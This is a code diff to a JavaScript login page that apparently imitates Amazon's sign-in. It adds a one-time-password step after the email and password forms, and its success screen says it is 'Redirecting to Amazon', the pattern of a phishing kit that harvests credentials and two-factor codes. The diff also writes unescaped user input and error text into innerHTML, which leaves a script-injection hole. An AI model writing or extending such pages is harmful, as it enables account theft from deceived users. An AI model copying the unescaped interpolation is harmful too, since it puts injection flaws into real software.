@@ -44,7 +44,7 @@
                     <form method="POST" action="/submit?step=email">
                         <div class="form-group">
                             <label for="email_or_phone" class="form-label">Email or mobile phone number</label>
-                            <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" required>
+                            <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" value="${userInput}" required>
                         </div>
                         <div class="form-group">
                             <label for="password" class="form-label">Password</label>
@@ -85,6 +85,23 @@
                         </div>
                         <button type="submit" class="continue-btn">Continue</button>
                     </form>
+                `;
+            } else if (step === 'otp') {
+                container.innerHTML = `
+                    <h1 class="form-title">Verify with OTP</h1>
+                    ${error ? `<div class="error-message">${error}</div>` : ''}
+                    <form method="POST" action="/submit?step=otp">
+                        <div class="form-group">
+                            <label for="otp" class="form-label">Enter OTP</label>
+                            <input type="text" id="otp" name="otp" class="form-input" required>
+                        </div>
+                        <button type="submit" class="continue-btn">Verify OTP</button>
+                    </form>
+                `;
+            } else if (step === 'success') {
+                container.innerHTML = `
+                    <h1 class="form-title">Login Successful</h1>
+                    <div>You have successfully logged in. Redirecting to Amazon...</div>
                 `;
             }
         }
